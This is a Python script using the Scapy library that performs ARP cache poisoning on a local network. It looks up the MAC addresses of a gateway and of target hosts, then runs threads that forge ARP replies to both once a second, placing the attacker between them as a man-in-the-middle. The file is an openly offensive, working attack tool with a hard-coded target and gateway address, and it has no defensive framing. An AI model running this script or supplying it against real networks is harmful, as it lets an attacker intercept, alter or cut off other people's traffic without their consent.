from scapy.all import *
from scapy.layers.l2 import ARP, Ether


class Spoofer(threading.Thread):
    def __init__(self, gateway_ip, gateway_mac, target_ip, target_mac, interface):
        threading.Thread.__init__(self)
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.target_ip = target_ip
        self.interface = interface
        self.target_mac = target_mac

    def run(self):
        p_target = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.target_mac)
        p_gateway = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)
        print("Starting work: psrc={}, pdst={}, hwdst={}".format(self.gateway_ip, self.target_ip, self.target_mac))
        print("Starting work: psrc={}, pdst={}, hwdst={}".format(self.target_ip, self.gateway_ip, self.gateway_mac))
        while True:
            send(p_target, verbose=False, iface=self.interface)
            send(p_gateway, verbose=False, iface=self.interface)
            time.sleep(1)


def get_mac(ip_address, interface):
    responses, unanswered = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
        timeout=2,
        retry=10,
        verbose=False,
        iface=interface
    )
    for s, r in responses:
        return r[Ether].src
    return None


def attack(targets, gateway_ip, interface, sleep=True):
    gateway_mac = get_mac(gateway_ip, interface)
    threads = []
    for target_ip in targets:
        target_mac = get_mac(target_ip, interface)
        t = Spoofer(gateway_ip, gateway_mac, target_ip, target_mac, interface)
        t.daemon = True
        threads.append(t)
    for t in threads:
        t.start()
    while sleep:
        time.sleep(10)


def main():
    targets = ["192.168.0.228"]
    gateway_ip = "192.168.0.107"
    interface = "ens33"
    attack(targets, gateway_ip, interface)


if __name__ == "__main__":
    main()
